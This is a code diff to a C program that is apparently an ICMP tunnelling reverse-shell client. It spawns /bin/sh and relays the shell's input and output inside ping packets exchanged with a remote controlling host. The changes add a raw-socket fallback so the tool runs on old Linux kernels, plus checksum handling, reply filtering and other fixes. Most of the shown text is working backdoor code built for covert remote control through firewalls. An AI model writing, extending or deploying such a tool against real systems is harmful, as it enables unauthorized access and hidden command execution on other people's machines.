@@ -28,6 +28,7 @@
 #include <fcntl.h>
 #include <signal.h>
 #include <netinet/in.h>
+#include <netinet/ip.h>
 #include <netinet/ip_icmp.h>
 #include <arpa/inet.h>
 
@@ -55,7 +56,6 @@ unsigned int delay, timeout_val;
 unsigned int ip_addr;
 
 unsigned char *in_buf, *out_buf;
-unsigned char *in_buf, *out_buf;
 
 unsigned int in_buf_size, out_buf_size;
 int shell_fds[2]; // shell_fds[0] will read from the child process, shell_fds[1] will write to it
@@ -69,6 +69,7 @@ struct sockaddr_in addr;
 int sequence;
 int sock;
 int debug;
+int use_raw; /* 0 = ICMP ping socket (Linux >= 2.6.39), 1 = raw ICMP socket (older kernels) */
 unsigned char data[SEND_BUFF_SIZE];	
 
 /* 
@@ -81,6 +82,28 @@ struct timeval timeout;
 fd_set read_set;
 socklen_t slen;
 struct icmphdr rcv_hdr;	
+
+/* Standard 16-bit one's complement checksum, needed for raw ICMP sockets
+ * (the kernel fills it in for ICMP ping sockets, but not for SOCK_RAW). */
+unsigned short in_cksum(const void *buf, int len)
+{
+	const unsigned short *ptr = (const unsigned short *)buf;
+	unsigned int sum = 0;
+
+	while (len > 1) {
+		sum += *ptr++;
+		len -= 2;
+	}
+	if (len == 1) {
+		unsigned short odd = 0;
+		*((unsigned char *)&odd) = *(const unsigned char *)ptr;
+		sum += odd;
+	}
+	while (sum >> 16)
+		sum = (sum & 0xffff) + (sum >> 16);
+
+	return (unsigned short)~sum;
+}
 
 // Based on this: https://stackoverflow.com/questions/3884103/can-popen-make-bidirectional-pipes-like-pipe-fork this
 /* Spawn a process from pfunc, returning it's pid. The fds array passed will
@@ -121,7 +144,11 @@ pid_t spawn_shell(int fds[2])
 		dup2(pipes[2], 0);
 		dup2(pipes[1], 1);
 		dup2(pipes[1], 2);	
-		execve("/bin/sh", 0, 0);
+		{
+			char *const sh_argv[] = { "/bin/sh", NULL };
+			char *const sh_envp[] = { NULL };
+			execve("/bin/sh", sh_argv, sh_envp);
+		}
     }
 
     return -1; /* ? */
@@ -139,7 +166,7 @@ void usage(char *path)	// READY
 	printf("  -b num             maximal number of blanks (unanswered icmp requests)\n");
     printf("                     before quitting\n");
 	printf("  -v				 verbose\n");
-	printf("  -s bytes           maximal data buffer size in bytes (default is 64 bytes)\n\n", DEFAULT_MAX_DATA_SIZE);
+	printf("  -s bytes           maximal data buffer size in bytes (default is %u bytes)\n\n", DEFAULT_MAX_DATA_SIZE);
 	printf("In order to improve the speed, lower the delay (-d) between requests or\n");
     printf("increase the size (-s) of the data buffer\n");
 }
@@ -148,16 +175,26 @@ int transfer_icmp()
 {
 	unsigned int nbytes;
 	int rc;
+	unsigned char *icmp_pkt;
+	int icmp_len;
 	
 	memset(in_buf, 0x00, max_data_size + ICMP_HEADERS_SIZE); // recv buffer
 	memset(data, 0x00, SEND_BUFF_SIZE);	// outgoing message buffer
 	
 	icmp_hdr.un.echo.sequence = sequence++;
+	icmp_hdr.checksum = 0;
 	
 	memcpy(data, &icmp_hdr, sizeof icmp_hdr);
 	if(out_buf_size) // if there is any data to be sent, add it here, otherwise we'll just send an empty beacon
 	{
 		memcpy(data + sizeof icmp_hdr, out_buf, out_buf_size);  
+	}
+
+	/* Ping sockets let the kernel fill in the checksum; raw sockets do not. */
+	if (use_raw)
+	{
+		icmp_hdr.checksum = in_cksum(data, sizeof icmp_hdr + out_buf_size);
+		memcpy(data, &icmp_hdr, sizeof icmp_hdr);
 	}
 
     rc = sendto(sock, data, sizeof icmp_hdr + out_buf_size, 0, (struct sockaddr*)&addr, sizeof addr);
@@ -168,43 +205,81 @@ int transfer_icmp()
     }
     if(debug) puts("Sent ICMP\n");
 	
-	// now, reading the response
-    memset(&read_set, 0, sizeof read_set);
-    FD_SET(sock, &read_set);
+	/* Now read the response. Raw sockets also receive unrelated ICMP traffic
+	 * (e.g. our own echo request on loopback), so keep reading until we get
+	 * a matching echo reply or the timeout expires. */
+	for (;;)
+	{
+		struct timeval tv = timeout;
 
-    //wait for a reply with a timeout
-    rc = select(sock + 1, &read_set, NULL, NULL, &timeout);
-    if (rc == 0) 
-	{
-        if(debug) puts("Got no reply\n");
-        return TRANSFER_FAILURE; // continue;
-    } 
-	else if (rc < 0) 
-	{
-            perror("Select");
-            return TRANSFER_FAILURE; // break; // was here originally, replaced with return; as now not in the loop
-    }
-    //we don't care about the sender address in this example..
-    slen = 0;
-    rc = recvfrom(sock, data, sizeof data, 0, NULL, &slen);
-    if (rc <= 0) 
-	{
-        perror("recvfrom");
-		return TRANSFER_FAILURE;	// we probably want to move this mallow up and just memset it in this function
-    } 	// so we don't have to call free everytime before we return;
-	else if (rc < sizeof rcv_hdr) 
-	{
-        if(debug) printf("Error, got short ICMP packet, %d bytes\n", rc);
-		return TRANSFER_FAILURE;
-    }
-    memcpy(&rcv_hdr, data, sizeof rcv_hdr);	
-    if (rcv_hdr.type != ICMP_ECHOREPLY) 
-	{
-		 if(debug) printf("[ERROR] Got ICMP packet with unexpected type 0x%x ?!?\n", rcv_hdr.type);
-		 return TRANSFER_FAILURE;
+		FD_ZERO(&read_set);
+		FD_SET(sock, &read_set);
+
+		//wait for a reply with a timeout
+		rc = select(sock + 1, &read_set, NULL, NULL, &tv);
+		if (rc == 0) 
+		{
+			if(debug) puts("Got no reply\n");
+			return TRANSFER_FAILURE;
+		} 
+		else if (rc < 0) 
+		{
+			perror("Select");
+			return TRANSFER_FAILURE;
+		}
+		//we don't care about the sender address in this example..
+		slen = 0;
+		rc = recvfrom(sock, data, sizeof data, 0, NULL, &slen);
+		if (rc <= 0) 
+		{
+			perror("recvfrom");
+			return TRANSFER_FAILURE;
+		}
+		icmp_pkt = data;
+		icmp_len = rc;
+
+		/* Raw ICMP sockets deliver the IPv4 header first; skip it. */
+		if (use_raw) 
+		{
+			struct iphdr *iph;
+			int ip_hlen;
+
+			if (rc < (int)sizeof(struct iphdr))
+			{
+				if(debug) printf("Error, got short IP packet, %d bytes\n", rc);
+				continue;
+			}
+			iph = (struct iphdr *)data;
+			ip_hlen = iph->ihl * 4;
+			if (ip_hlen < (int)sizeof(struct iphdr) || ip_hlen > rc)
+			{
+				if(debug) printf("Error, got invalid IP header length %d\n", ip_hlen);
+				continue;
+			}
+			icmp_pkt = data + ip_hlen;
+			icmp_len = rc - ip_hlen;
+		}
+		if (icmp_len < (int)sizeof rcv_hdr) 
+		{
+			if(debug) printf("Error, got short ICMP packet, %d bytes\n", icmp_len);
+			continue;
+		}
+		memcpy(&rcv_hdr, icmp_pkt, sizeof rcv_hdr);	
+		if (rcv_hdr.type != ICMP_ECHOREPLY) 
+		{
+			if(debug) printf("[DEBUG] Ignoring ICMP packet with non-reply type 0x%x.\n", rcv_hdr.type);
+			continue;
+		}
+		/* Raw sockets see every ICMP reply on the host, so filter by our id. */
+		if (use_raw && rcv_hdr.un.echo.id != icmp_hdr.un.echo.id)
+		{
+			if(debug) printf("[DEBUG] Ignoring reply with id 0x%x (expected 0x%x).\n", rcv_hdr.un.echo.id, icmp_hdr.un.echo.id);
+			continue;
+		}
+		break; /* got our echo reply */
 	}
-	// so, our response data is at: data+sizeof rcv_hdr,data+sizeof rcv_hdr+(rc-sizeof rcv_hdr)-1
-	int received_data_size = rc - sizeof rcv_hdr;
+	// so, our response data is at: icmp_pkt+sizeof rcv_hdr
+	int received_data_size = icmp_len - sizeof rcv_hdr;
 	if(debug) printf("[DEBUG] Received ICMP Reply, id=0x%x, sequence =  0x%x, total bytes: %d, data bytes: %d.\n", icmp_hdr.un.echo.id, icmp_hdr.un.echo.sequence, rc, received_data_size);
 	if (received_data_size > max_data_size)  // so, we received more data in a single reply than we expected
 	{										   // I guess this should not happen when dealing with a compatible server
@@ -215,7 +290,7 @@ int transfer_icmp()
 	{
 		nbytes = received_data_size;
 	}
-	memcpy(in_buf, data+sizeof rcv_hdr, nbytes);
+	memcpy(in_buf, icmp_pkt+sizeof rcv_hdr, nbytes);
 	in_buf_size = nbytes;
 	return TRANSFER_SUCCESS;
 }
@@ -301,8 +376,8 @@ int main(int argc, char **argv)
 		if(debug) printf("[DEBUG] SHELL PID: %d, fd[0]: %d, fd[1]: %d.\n", shell_pid, shell_fds[0], shell_fds[1]);
 	}
 	
-	// Allow ourselves using ICMP sockets:
-	system("sysctl -w net.ipv4.ping_group_range=\"0 0\"");
+	// Allow ourselves using ICMP ping sockets (only needed on modern kernels,
+	// applied below once we know which socket type is available):
 	// from the manual:
 	/*
 	       ping_group_range (two integers; default: see below; since Linux
@@ -326,12 +401,29 @@ int main(int argc, char **argv)
 	*/
 	// create the ICMP socket
     sequence = 0;
+	/* Modern kernels (>= 2.6.39) provide ICMP ping sockets via SOCK_DGRAM.
+	 * Older kernels (e.g. 2.6.9-5.EL) don't, so fall back to a raw ICMP
+	 * socket, which requires root but has always been available. */
     sock = socket(AF_INET,SOCK_DGRAM,IPPROTO_ICMP);
+	if (sock < 0)
+	{
+		sock = socket(AF_INET,SOCK_RAW,IPPROTO_ICMP);
+		use_raw = 1;
+	}
     if (sock < 0) 
 	{
         perror("socket");
         return -1;
     }
+	if (!use_raw)
+	{
+		if(debug) printf("[DEBUG] Using ICMP ping socket (SOCK_DGRAM).\n");
+		system("sysctl -w net.ipv4.ping_group_range=\"0 0\"");
+	}
+	else
+	{
+		if(debug) printf("[DEBUG] Ping socket unavailable, using raw ICMP socket (SOCK_RAW).\n");
+	}
 
     memset(&addr, 0, sizeof addr);
     addr.sin_family = AF_INET;
@@ -346,8 +438,8 @@ int main(int argc, char **argv)
 	timeout.tv_usec=miliseconds_left*1000;
 	
 	// allocate transfer buffers
-	in_buf = (char *) malloc(max_data_size + ICMP_HEADERS_SIZE);
-	out_buf = (char *) malloc(max_data_size + ICMP_HEADERS_SIZE);
+	in_buf = (unsigned char *) malloc(max_data_size + ICMP_HEADERS_SIZE);
+	out_buf = (unsigned char *) malloc(max_data_size + ICMP_HEADERS_SIZE);
 	if (!in_buf || !out_buf) 
 	{
 		printf("[ERROR] Failed to allocate memory for transfer buffers\n");
@@ -362,11 +454,11 @@ int main(int argc, char **argv)
 		switch(status) {
 			case STATUS_SINGLE:
 				// reply with a static string
-				out_buf_size = sprintf(out_buf, "[TEST] Test1234\n");
+				out_buf_size = sprintf((char *)out_buf, "[TEST] Test1234\n");
 				break;
 			case STATUS_PROCESS_NOT_CREATED:
 				// reply with error message
-				out_buf_size = sprintf(out_buf, "[ERROR] Process was not created\n");
+				out_buf_size = sprintf((char *)out_buf, "[ERROR] Process was not created\n");
 				break;
 			default:
 
@@ -444,7 +536,8 @@ int main(int argc, char **argv)
 	if (status == STATUS_OK) {
 		if(shell_pid>0) kill(shell_pid, SIGKILL); // exit if no reply from the master was received max_blanks time
 	}
-	// restore the default ping_group_range setting
-	system("sysctl -w net.ipv4.ping_group_range=\"1 0\"");
+	// restore the default ping_group_range setting (only touched it for ping sockets)
+	if (!use_raw)
+		system("sysctl -w net.ipv4.ping_group_range=\"1 0\"");
     return 0;
 }
